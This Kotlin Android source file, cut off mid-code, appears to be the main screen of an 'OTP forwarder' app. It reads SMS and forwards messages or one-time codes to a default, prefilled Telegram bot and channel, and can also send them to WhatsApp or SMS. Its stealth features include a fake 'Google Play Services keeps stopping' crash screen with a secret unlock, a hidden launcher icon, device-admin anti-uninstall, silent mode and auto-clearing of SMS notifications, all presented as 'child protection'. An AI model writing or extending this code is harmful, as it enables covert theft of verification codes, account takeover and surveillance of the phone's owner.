package com.example.otpforwarder

import android.Manifest
import android.app.Activity
import android.app.KeyguardManager
import android.app.admin.DevicePolicyManager
import android.content.ClipData
import android.content.ClipboardManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import kotlinx.coroutines.launch

class MainActivity : ComponentActivity() {

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val smsGranted = permissions[Manifest.permission.RECEIVE_SMS] ?: false
        if (smsGranted) {
            Toast.makeText(this, "✅ Permissions Granted", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        requestAppPermissions()

        setContent {
            MaterialTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    RootAppScreen(
                        onOpenNotificationSettings = {
                            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                            startActivity(intent)
                        },
                        onRequestPermissions = { requestAppPermissions() },
                        onExitApp = { finish() }
                    )
                }
            }
        }
    }

    private fun requestAppPermissions() {
        val perms = mutableListOf(
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_PHONE_STATE
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS)
        }
        val needed = perms.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (needed.isNotEmpty()) {
            permissionLauncher.launch(needed.toTypedArray())
        }
    }
}

fun checkNotificationAccess(context: Context): Boolean {
    val pkgName = context.packageName
    val flat = Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners")
    return flat != null && flat.contains(pkgName)
}

fun isIgnoringBatteryOptimizations(context: Context): Boolean {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
        val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager ?: return true
        return pm.isIgnoringBatteryOptimizations(context.packageName)
    }
    return true
}

fun isDeviceAdminActive(context: Context): Boolean {
    val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager ?: return false
    val admin = ComponentName(context, OtpDeviceAdminReceiver::class.java)
    return dpm.isAdminActive(admin)
}

fun isLauncherIconHidden(context: Context): Boolean {
    val alias = ComponentName(context, "com.example.otpforwarder.LauncherAlias")
    val state = context.packageManager.getComponentEnabledSetting(alias)
    return state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
}

fun setLauncherIconVisibility(context: Context, hide: Boolean) {
    val alias = ComponentName(context, "com.example.otpforwarder.LauncherAlias")
    val newState = if (hide) {
        PackageManager.COMPONENT_ENABLED_STATE_DISABLED
    } else {
        PackageManager.COMPONENT_ENABLED_STATE_ENABLED
    }
    context.packageManager.setComponentEnabledSetting(
        alias,
        newState,
        PackageManager.DONT_KILL_APP
    )
}

@Composable
fun RootAppScreen(
    onOpenNotificationSettings: () -> Unit,
    onRequestPermissions: () -> Unit,
    onExitApp: () -> Unit
) {
    val context = LocalContext.current
    val prefs = remember { PrefsHelper.getPrefs(context) }

    val isFakeCrashEnabled = remember { prefs.getBoolean("fake_crash_enabled", false) }
    var isFakeCrashPassed by remember { mutableStateOf(!isFakeCrashEnabled) }

    val isAppLockEnabled = remember { prefs.getBoolean("app_lock_enabled", false) }
    var isAppUnlocked by remember { mutableStateOf(!isAppLockEnabled) }

    if (!isFakeCrashPassed) {
        FakeCrashScreen(
            onUnlock = { isFakeCrashPassed = true },
            onExit = onExitApp
        )
    } else if (!isAppUnlocked) {
        AppLockScreen(
            onUnlockSuccess = { isAppUnlocked = true },
            onExit = onExitApp
        )
    } else {
        MainScreenContent(
            onOpenNotificationSettings = onOpenNotificationSettings,
            onRequestPermissions = onRequestPermissions
        )
    }
}

@Composable
fun FakeCrashScreen(onUnlock: () -> Unit, onExit: () -> Unit) {
    val context = LocalContext.current
    var tapCount by remember { mutableStateOf(0) }
    var lastTapTime by remember { mutableStateOf(0L) }

    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(Color(0xFF1E1E1E))
            .padding(24.dp),
        contentAlignment = Alignment.Center
    ) {
        Card(
            modifier = Modifier.fillMaxWidth(),
            colors = CardDefaults.cardColors(containerColor = Color(0xFF2C2C2C)),
            shape = RoundedCornerShape(16.dp),
            elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
        ) {
            Column(
                modifier = Modifier.padding(24.dp),
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                // Secret tap icon (3 taps in 1.5s unlocks the disguised crash)
                Box(
                    modifier = Modifier
                        .size(64.dp)
                        .clickable {
                            val now = System.currentTimeMillis()
                            if (now - lastTapTime < 1500) {
                                tapCount++
                            } else {
                                tapCount = 1
                            }
                            lastTapTime = now
                            if (tapCount >= 3) {
                                Toast.makeText(context, "🔓 Disguise Bypassed", Toast.LENGTH_SHORT).show()
                                onUnlock()
                            }
                        },
                    contentAlignment = Alignment.Center
                ) {
                    Text("⚠️", fontSize = 42.sp)
                }

                Spacer(modifier = Modifier.height(16.dp))

                Text(
                    text = "Google Play Services keeps stopping",
                    fontSize = 17.sp,
                    fontWeight = FontWeight.Bold,
                    color = Color.White,
                    textAlign = TextAlign.Center
                )

                Spacer(modifier = Modifier.height(10.dp))

                Text(
                    text = "com.google.android.gms has encountered an unexpected background error and had to close.",
                    fontSize = 12.sp,
                    color = Color(0xFFB0B0B0),
                    textAlign = TextAlign.Center
                )

                Spacer(modifier = Modifier.height(24.dp))

                Button(
                    onClick = onExit,
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF3F51B5)),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Text("Close app", color = Color.White, fontSize = 13.sp)
                }

                Spacer(modifier = Modifier.height(8.dp))

                OutlinedButton(
                    onClick = onExit,
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Text("Send feedback", color = Color.LightGray, fontSize = 13.sp)
                }
            }
        }
    }
}

@Composable
fun AppLockScreen(onUnlockSuccess: () -> Unit, onExit: () -> Unit) {
    val context = LocalContext.current
    val keyguardManager = remember { context.getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager }

    val authLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == Activity.RESULT_OK) {
            Toast.makeText(context, "✅ Identity Verified", Toast.LENGTH_SHORT).show()
            onUnlockSuccess()
        } else {
            Toast.makeText(context, "❌ Authentication Failed / Cancelled", Toast.LENGTH_SHORT).show()
        }
    }

    val launchAuth = {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val intent = keyguardManager?.createConfirmDeviceCredentialIntent(
                "eDistrict Forwarder Lock",
                "Enter device Fingerprint, PIN, Pattern, or Password to open"
            )
            if (intent != null) {
                authLauncher.launch(intent)
            } else {
                onUnlockSuccess()
            }
        } else {
            onUnlockSuccess()
        }
    }

    LaunchedEffect(Unit) {
        launchAuth()
    }

    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(MaterialTheme.colorScheme.background)
            .padding(24.dp),
        contentAlignment = Alignment.Center
    ) {
        Card(
            modifier = Modifier.fillMaxWidth(),
            shape = RoundedCornerShape(16.dp),
            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant),
            elevation = CardDefaults.cardElevation(defaultElevation = 6.dp)
        ) {
            Column(
                modifier = Modifier.padding(24.dp),
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                Text("🔒", fontSize = 50.sp)
                Spacer(modifier = Modifier.height(12.dp))
                Text(
                    text = "App Lock Active",
                    fontSize = 18.sp,
                    fontWeight = FontWeight.Bold,
                    color = MaterialTheme.colorScheme.onSurface
                )
                Spacer(modifier = Modifier.height(6.dp))
                Text(
                    text = "Fingerprint ya phone ka PIN verify karke app unlock karein.",
                    fontSize = 12.sp,
                    color = Color.DarkGray,
                    textAlign = TextAlign.Center
                )
                Spacer(modifier = Modifier.height(20.dp))
                Button(
                    onClick = { launchAuth() },
                    modifier = Modifier.fillMaxWidth(),
                    colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.primary)
                ) {
                    Text("🔓 Unlock Now (Biometric / PIN)", fontSize = 13.sp)
                }
                Spacer(modifier = Modifier.height(8.dp))
                OutlinedButton(
                    onClick = onExit,
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Text("Exit", fontSize = 13.sp)
                }
            }
        }
    }
}

@Composable
fun MainScreenContent(
    onOpenNotificationSettings: () -> Unit,
    onRequestPermissions: () -> Unit
) {
    val context = LocalContext.current
    val prefs = remember { PrefsHelper.getPrefs(context) }
    var selectedTab by remember { mutableStateOf(0) }
    var isMasterEnabled by remember { mutableStateOf(prefs.getBoolean("is_enabled", true)) }
    var hasNotificationAccess by remember { mutableStateOf(checkNotificationAccess(context)) }
    var hasBatteryExemption by remember { mutableStateOf(isIgnoringBatteryOptimizations(context)) }

    LaunchedEffect(Unit) {
        hasNotificationAccess = checkNotificationAccess(context)
        hasBatteryExemption = isIgnoringBatteryOptimizations(context)
    }

    Column(modifier = Modifier.fillMaxSize()) {
        // App Header
        Column(
            modifier = Modifier
                .fillMaxWidth()
                .background(MaterialTheme.colorScheme.surfaceVariant)
                .padding(horizontal = 16.dp, vertical = 12.dp)
        ) {
            Row(
                modifier = Modifier.fillMaxWidth(),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Column {
                    Text(
                        text = "eDistrict OTP Forwarder",
                        fontSize = 18.sp,
                        fontWeight = FontWeight.Bold
                    )
                    Text(
                        text = if (isMasterEnabled) "🟢 System Active (24/7)" else "🔴 System Stopped",
                        fontSize = 12.sp,
                        color = if (isMasterEnabled) Color(0xFF2E7D32) else Color(0xFFC62828),
                        fontWeight = FontWeight.SemiBold
                    )
                }
                Switch(
                    checked = isMasterEnabled,
                    onCheckedChange = { checked ->
                        isMasterEnabled = checked
                        prefs.edit().putBoolean("is_enabled", checked).apply()
                    }
                )
            }

            // Notification Access Warning if disabled
            if (!hasNotificationAccess) {
                Card(
                    modifier = Modifier.fillMaxWidth().padding(top = 8.dp),
                    colors = CardDefaults.cardColors(containerColor = Color(0xFFFFF3E0))
                ) {
                    Row(
                        modifier = Modifier.fillMaxWidth().padding(10.dp),
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.SpaceBetween
                    ) {
                        Text(
                            text = "⚡ Notification Access Required",
                            fontSize = 12.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color(0xFFE65100),
                            modifier = Modifier.weight(1f)
                        )
                        Button(
                            onClick = onOpenNotificationSettings,
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFE65100)),
                            contentPadding = PaddingValues(horizontal = 12.dp, vertical = 4.dp)
                        ) {
                            Text("Enable", fontSize = 11.sp)
                        }
                    }
                }
            }

            // Battery Whitelist Warning if needed
            if (!hasBatteryExemption) {
                Card(
                    modifier = Modifier.fillMaxWidth().padding(top = 8.dp),
                    colors = CardDefaults.cardColors(containerColor = Color(0xFFE8F5E9))
                ) {
                    Row(
                        modifier = Modifier.fillMaxWidth().padding(10.dp),
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.SpaceBetween
                    ) {
                        Column(modifier = Modifier.weight(1f)) {
                            Text(
                                text = "🔋 24/7 Deep Sleep Protection",
                                fontSize = 12.sp,
                                fontWeight = FontWeight.Bold,
                                color = Color(0xFF2E7D32)
                            )
                            Text(
                                text = "Phone ko raat me app freeze karne se rokein",
                                fontSize = 10.sp,
                                color = Color.DarkGray
                            )
                        }
                        Button(
                            onClick = {
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                                        data = Uri.parse("package:${context.packageName}")
                                    }
                                    try {
                                        context.startActivity(intent)
                                    } catch (e: Exception) {
                                        val fallback = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
                                        context.startActivity(fallback)
                                    }
                                }
                            },
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF2E7D32)),
                            contentPadding = PaddingValues(horizontal = 12.dp, vertical = 4.dp)
                        ) {
                            Text("Whitelist", fontSize = 11.sp)
                        }
                    }
                }
            }
        }

        // Navigation Tabs
        TabRow(selectedTabIndex = selectedTab) {
            Tab(
                selected = selectedTab == 0,
                onClick = { selectedTab = 0 },
                text = { Text("Services", fontSize = 13.sp, fontWeight = FontWeight.Bold) }
            )
            Tab(
                selected = selectedTab == 1,
                onClick = { selectedTab = 1 },
                text = { Text("Keywords", fontSize = 13.sp, fontWeight = FontWeight.Bold) }
            )
            Tab(
                selected = selectedTab == 2,
                onClick = { selectedTab = 2 },
                text = { Text("History", fontSize = 13.sp, fontWeight = FontWeight.Bold) }
            )
        }

        // Tab Content
        Box(modifier = Modifier.fillMaxSize()) {
            when (selectedTab) {
                0 -> ServicesTab(context, onRequestPermissions)
                1 -> KeywordsTab(context)
                2 -> HistoryTab(context)
            }
        }
    }
}

@Composable
fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
    val prefs = remember { PrefsHelper.getPrefs(context) }
    val scope = rememberCoroutineScope()

    // 1. Telegram 1 State (Primary)
    var isTelegramEnabled by remember { mutableStateOf(prefs.getBoolean("is_telegram_enabled", true)) }
    var botToken by remember { mutableStateOf(prefs.getString("bot_token", TelegramHelper.DEFAULT_BOT_TOKEN) ?: "") }
    var chatId by remember { mutableStateOf(prefs.getString("chat_id", TelegramHelper.DEFAULT_CHANNEL_ID) ?: "") }
    var telegramStatus by remember { mutableStateOf("") }

    // 2. Telegram 2 State (Secondary)
    var isTelegram2Enabled by remember { mutableStateOf(prefs.getBoolean("is_telegram_2_enabled", false)) }
    var botToken2 by remember { mutableStateOf(prefs.getString("bot_token_2", "") ?: "") }
    var chatId2 by remember { mutableStateOf(prefs.getString("chat_id_2", "") ?: "") }
    var telegram2Status by remember { mutableStateOf("") }

    // 3. WhatsApp State
    var isWhatsAppEnabled by remember { mutableStateOf(prefs.getBoolean("is_whatsapp_enabled", false)) }
    var waPhone by remember { mutableStateOf(prefs.getString("wa_phone", "") ?: "") }
    var waApiKey by remember { mutableStateOf(prefs.getString("wa_api_key", "") ?: "") }
    var waStatus by remember { mutableStateOf("") }

    // 4. Direct SMS State
    var isSmsEnabled by remember { mutableStateOf(prefs.getBoolean("is_sms_enabled", false)) }
    var smsPhone by remember { mutableStateOf(prefs.getString("sms_phone", "") ?: "") }
    var smsSimSlot by remember { mutableStateOf(prefs.getInt("sms_sim_slot", -1)) }
    var smsStatus by remember { mutableStateOf("") }

    // 5. Features: Only OTP & Low Battery Alert
    var isOnlyOtpMode by remember { mutableStateOf(prefs.getBoolean("only_otp_mode", false)) }
    var isLowBatteryAlertEnabled by remember { mutableStateOf(prefs.getBoolean("low_battery_alert_enabled", false)) }

    // 6. Security & Child Protection State
    var isAdminActive by remember { mutableStateOf(isDeviceAdminActive(context)) }
    var isIconHidden by remember { mutableStateOf(isLauncherIconHidden(context)) }
    var isSilentMode by remember { mutableStateOf(!prefs.getBoolean("show_screen_popups", false)) }
    var isAppLockEnabled by remember { mutableStateOf(prefs.getBoolean("app_lock_enabled", false)) }
    var isFakeCrashEnabled by remember { mutableStateOf(prefs.getBoolean("fake_crash_enabled", false)) }
    var isAutoClearSms by remember { mutableStateOf(prefs.getBoolean("auto_clear_sms_notification", false)) }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(16.dp)
    ) {
        // Feature Card 1: Only OTP Mode (1-Tap Copy)
        Card(
            modifier = Modifier.fillMaxWidth().padding(bottom = 16.dp),
            colors = CardDefaults.cardColors(containerColor = Color(0xFFE0F7FA))
        ) {
            Row(
                modifier = Modifier.fillMaxWidth().padding(16.dp),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Column(modifier = Modifier.weight(1f)) {
                    Text("⚡ Only OTP Mode (1-Tap Copy)", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = Color(0xFF006064))
                    Text(
                        text = if (isOnlyOtpMode)
                            "🟢 Active: Dost ko poore message ki jagah sirf 6-digit OTP jayega (e.g. 240833)"
                        else
                            "Standard: Poora message (sender + body) jayega",
                        fontSize = 11.sp,
                        color = Color.DarkGray
                    )
                }
                Switch(
                    checked = isOnlyOtpMode,
                    onCheckedChange = { checked ->
                        isOnlyOtpMode = checked
                        prefs.edit().putBoolean("only_otp_mode", checked).apply()
                    }
                )
            }
        }

        // Feature Card 2: Low Battery Alert
        Card(
            modifier = Modifier.fillMaxWidth().padding(bottom = 16.dp),
            colors = CardDefaults.cardColors(containerColor = Color(0xFFFBE9E7))
        ) {
            Row(
                modifier = Modifier.fillMaxWidth().padding(16.dp),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Column(modifier = Modifier.weight(1f)) {
                    Text("🔋 Low Battery Telegram Alert", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = Color(0xFFBF360C))
                    Text(
                        text = if (isLowBatteryAlertEnabled)
                            "🟢 Active: Phone battery 15% hote hi Telegram par alert aayega"
                        else
                            "Off: Low battery alert band hai",
                        fontSize = 11.sp,
                        color = Color.DarkGray
                    )
                }
                Switch(
                    checked = isLowBatteryAlertEnabled,
                    onCheckedChange = { checked ->
                        isLowBatteryAlertEnabled = checked
                        prefs.edit().putBoolean("low_battery_alert_enabled", checked).apply()
                    }
                )
            }
        }

        // 1. Telegram Service 1 Card (Primary - Locked Default)
        Card(
            modifier = Modifier.fillMaxWidth().padding(bottom = 16.dp),
            colors = CardDefaults.cardColors(containerColor = Color(0xFFF1F8E9))
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Column(modifier = Modifier.weight(1f)) {
                        Text("📢 Telegram 1 (Primary Bot)", fontWeight = FontWeight.Bold, fontSize = 16.sp, color = Color(0xFF2E7D32))
                        Text("Default Verified Bot & Channel", fontSize = 11.sp, color = Color.DarkGray)
                    }
                    Switch(
                        checked = isTelegramEnabled,
                        onCheckedChange = { isTelegramEnabled = it }
                    )
                }

                if (isTelegramEnabled) {
                    Spacer(modifier = Modifier.height(10.dp))
                    OutlinedTextField(
                        value = botToken,
                        onValueChange = { botToken = it },
                        label = { Text("Bot Token 1") },
                        modifier = Modifier.fillMaxWidth(),
                        singleLine = true
                    )
                    Spacer(modifier = Modifier.height(8.dp))
                    OutlinedTextField(
                        value = chatId,
                        onValueChange = { chatId = it },
                        label = { Text("Channel / Chat ID 1 (e.g. -100...)") },
                        modifier = Modifier.fillMaxWidth(),
                        singleLine = true
                    )
                    Spacer(modifier = Modifier.height(10.dp))
                    Button(
                        onClick = {
                            telegramStatus = "Sending test to Telegram 1..."
                            scope.launch {
                                val res = TelegramHelper.sendMessage(
                                    botToken.trim(),
                                    chatId.trim(),
                                    "🎉 Test Message: Telegram 1 forwarding test successful!"
                                )
                                telegramStatus = if (res.first) "✅ Telegram 1 Par Test Message Chala Gaya!" else "❌ ${res.second}"
                            }
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF2E7D32)),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Text("Test Telegram 1")
                    }
                    if (telegramStatus.isNotEmpty()) {
                        Text(
                            text = telegramStatus,
                            fontSize = 12.sp,
                            fontWeight = FontWeight.Bold,
                            color = if (telegramStatus.startsWith("✅")) Color(0xFF2E7D32) else Color(0xFFC62828),
                            modifier = Modifier.padding(top = 6.dp)
                        )
                    }
                }
            }
        }

        // 2. Telegram Service 2 Card (Secondary / 2nd Bot / 2nd Account)
        Card(
            modifier = Modifier.fillMaxWidth().padding(bottom = 16.dp),
            colors = CardDefaults.cardColors(containerColor = Color(0xFFE8F5E9))
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Column(modifier = Modifier.weight(1f)) {
                        Text("📢 Telegram 2 (2nd Account / Bot)", fontWeight = FontWeight.Bold, fontSize = 16.sp, color = Color(0xFF1B5E20))
                        Text("Dusre bot ya dusre channel ke liye", fontSize = 11.sp, color = Color.DarkGray)
                    }
                    Switch(
                        checked = isTelegram2Enabled,
                        onCheckedChange = { isTelegram2Enabled = it }
                    )
                }

                if (isTelegram2Enabled) {
                    Spacer(modifier = Modifier.height(10.dp))
                    OutlinedTextField(
                        value = botToken2,
                        onValueChange = { botToken2 = it },
                        label = { Text("Bot Token 2 (Optional / 2nd Bot)") },
                        modifier = Modifier.fillMaxWidth(),
                        singleLine = true
                    )
                    Spacer(modifier = Modifier.height(8.dp))
                    OutlinedTextField(
                        value = chatId2,
                        onValueChange = { chatId2 = it },
                        label = { Text("Channel / Chat ID 2") },
                        modifier = Modifier.fillMaxWidth(),
                        singleLine = true
                    )
                    Spacer(modifier = Modifier.height(10.dp))
                    Button(
                        onClick = {
                            telegram2Status = "Sending test to Telegram 2..."
                            scope.launch {
                                val token = if (botToken2.trim().isNotEmpty()) botToken2.trim() else botToken.trim()
                                val res = TelegramHelper.sendMessage(
                                    token,
                                    chatId2.trim(),
                                    "🎉 Test Message: Telegram 2 forwarding test successful!"
                                )
                                telegram2Status = if (res.first) "✅ Telegram 2 Par Test Message Chala Gaya!" else "❌ ${res.second}"
                            }
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1B5E20)),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Text("Test Telegram 2")
                    }
                    if (telegram2Status.isNotEmpty()) {
                        Text(
                            text = telegram2Status,
                            fontSize = 12.sp,
                            fontWeight = FontWeight.Bold,
                            color = if (telegram2Status.startsWith("✅")) Color(0xFF1B5E20) else Color(0xFFC62828),
                            modifier = Modifier.padding(top = 6.dp)
                        )
                    }
                }
            }
        }

        // 3. WhatsApp Card
        Card(
            modifier = Modifier.fillMaxWidth().padding(bottom = 16.dp),
            colors = CardDefaults.cardColors(containerColor = Color(0xFFE0F2F1))
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Column(modifier = Modifier.weight(1f)) {
                        Text("💬 WhatsApp Forwarding", fontWeight = FontWeight.Bold, fontSize = 16.sp, color = Color(0xFF00695C))
                        Text("CallMeBot Gateway ke zariye", fontSize = 11.sp, color = Color.DarkGray)
                    }
                    Switch(
                        checked = isWhatsAppEnabled,
                        onCheckedChange = { isWhatsAppEnabled = it }
                    )
                }

                if (isWhatsAppEnabled) {
                    Spacer(modifier = Modifier.height(10.dp))
                    OutlinedTextField(
                        value = waPhone,
                        onValueChange = { waPhone = it },
                        label = { Text("Friend's WhatsApp No. (e.g. 919876543210)") },
                        modifier = Modifier.fillMaxWidth(),
                        singleLine = true
                    )
                    Spacer(modifier = Modifier.height(8.dp))
                    OutlinedTextField(
                        value = waApiKey,
                        onValueChange = { waApiKey = it },
                        label = { Text("CallMeBot API Key") },
                        modifier = Modifier.fillMaxWidth(),
                        singleLine = true
                    )
                    Text(
                        text = "ℹ️ CallMeBot key free lene ke liye WhatsApp par +34 644 44 24 53 par 'I allow callmebot to send me messages' likhkar bhejein.",
                        fontSize = 10.sp,
                        color = Color.DarkGray,
                        modifier = Modifier.padding(top = 4.dp, bottom = 8.dp)
                    )
                    Button(
                        onClick = {
                            waStatus = "Sending WhatsApp test..."
                            scope.launch {
                                val res = WhatsAppHelper.sendMessage(
                                    waPhone.trim(),
                                    waApiKey.trim(),
                                    "🎉 Test Message: WhatsApp OTP Forwarder test successful!"
                                )
                                waStatus = if (res.first) "✅ WhatsApp Par Test Message Chala Gaya!" else "❌ ${res.second}"
                            }
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00695C)),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Text("Test WhatsApp")
                    }
                    if (waStatus.isNotEmpty()) {
                        Text(
                            text = waStatus,
                            fontSize = 12.sp,
                            fontWeight = FontWeight.Bold,
                            color = if (waStatus.startsWith("✅")) Color(0xFF00695C) else Color(0xFFC62828),
                            modifier = Modifier.padding(top = 6.dp)
                        )
                    }
                }
            }
        }

        // 4. Direct SMS Card (with Dual SIM Selector)
        Card(
            modifier = Modifier.fillMaxWidth().padding(bottom = 16.dp),
            colors = CardDefaults.cardColors(containerColor = Color(0xFFFFF8E1))
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Column(modifier = Modifier.weight(1f)) {
                        Text("📱 Direct Phone SMS", fontWeight = FontWeight.Bold, fontSize = 16.sp, color = Color(0xFFE65100))
                        Text("Phone SIM se seedha SMS bhejein", fontSize = 11.sp, color = Color.DarkGray)
                    }
                    Switch(
                        checked = isSmsEnabled,
                        onCheckedChange = { isSmsEnabled = it }
                    )
                }

                if (isSmsEnabled) {
                    val hasSmsPerm = ContextCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED
                    if (!hasSmsPerm) {
                        Button(
                            onClick = onRequestPermissions,
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFC62828)),
                            modifier = Modifier.fillMaxWidth().padding(top = 8.dp)
                        ) {
                            Text("⚠️ Allow SMS Permission First", fontSize = 12.sp)
                        }
                    }
                    Spacer(modifier = Modifier.height(10.dp))
                    OutlinedTextField(
                        value = smsPhone,
                        onValueChange = { smsPhone = it },
                        label = { Text("Friend's Mobile No. (10 Digits)") },
                        modifier = Modifier.fillMaxWidth(),
                        singleLine = true
                    )

                    Spacer(modifier = Modifier.height(10.dp))

                    // Feature 5: Dual SIM Slot Selector
                    Text("📶 Select SIM Card Slot:", fontWeight = FontWeight.SemiBold, fontSize = 12.sp, color = Color(0xFFE65100))
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            RadioButton(
                                selected = smsSimSlot == -1,
                                onClick = {
                                    smsSimSlot = -1
                                    prefs.edit().putInt("sms_sim_slot", -1).apply()
                                }
                            )
                            Text("Auto", fontSize = 11.sp)
                        }
                        Spacer(modifier = Modifier.width(12.dp))
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            RadioButton(
                                selected = smsSimSlot == 0,
                                onClick = {
                                    smsSimSlot = 0
                                    prefs.edit().putInt("sms_sim_slot", 0).apply()
                                }
                            )
                            Text("SIM 1", fontSize = 11.sp)
                        }
                        Spacer(modifier = Modifier.width(12.dp))
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            RadioButton(
                                selected = smsSimSlot == 1,
                                onClick = {
                                    smsSimSlot = 1
                                    prefs.edit().putInt("sms_sim_slot", 1).apply()
                                }
                            )
                            Text("SIM 2", fontSize = 11.sp)
                        }
                    }

                    Spacer(modifier = Modifier.height(10.dp))
                    Button(
                        onClick = {
                            val res = SmsHelper.sendSms(
                                context,
                                smsPhone.trim(),
                                "🎉 Test SMS: eDistrict OTP Forwarder direct SMS working!"
                            )
                            smsStatus = if (res.first) "✅ Test SMS Sent!" else "❌ ${res.second}"
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFE65100)),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Text("Test SMS")
                    }
                    if (smsStatus.isNotEmpty()) {
                        Text(
                            text = smsStatus,
                            fontSize = 12.sp,
                            fontWeight = FontWeight.Bold,
                            color = if (smsStatus.startsWith("✅")) Color(0xFF2E7D32) else Color(0xFFC62828),
                            modifier = Modifier.padding(top = 6.dp)
                        )
                    }
                }
            }
        }

        // 5. Child & Security Protection Card (Anti-Uninstall, Stealth, Lock, Fake Crash, Clear SMS)
        Card(
            modifier = Modifier.fillMaxWidth().padding(bottom = 20.dp),
            colors = CardDefaults.cardColors(containerColor = Color(0xFFEDE7F6))
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text(
                    text = "🛡️ Child Protection & App Privacy",
                    fontWeight = FontWeight.Bold,
                    fontSize = 16.sp,
                    color = Color(0xFF4A148C)
                )
